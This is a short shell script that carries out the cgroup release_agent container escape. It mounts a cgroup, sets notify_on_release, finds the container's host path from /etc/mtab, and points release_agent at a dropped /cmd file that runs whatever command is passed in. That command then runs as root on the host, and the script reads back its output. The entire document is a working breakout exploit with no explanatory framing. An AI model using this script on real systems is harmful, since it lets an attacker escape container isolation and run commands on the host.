#!/bin/sh
random_name=$(date +%s | md5sum | cut -c1-10)

mkdir -p /tmp/cgrp 

mountpoint -q /tmp/cgrp || mount -t cgroup -o rdma cgroup /tmp/cgrp

mkdir /tmp/cgrp/$random_name

echo 1 > /tmp/cgrp/$random_name/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "$1 > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/$random_name/cgroup.procs"
sleep 1
head /output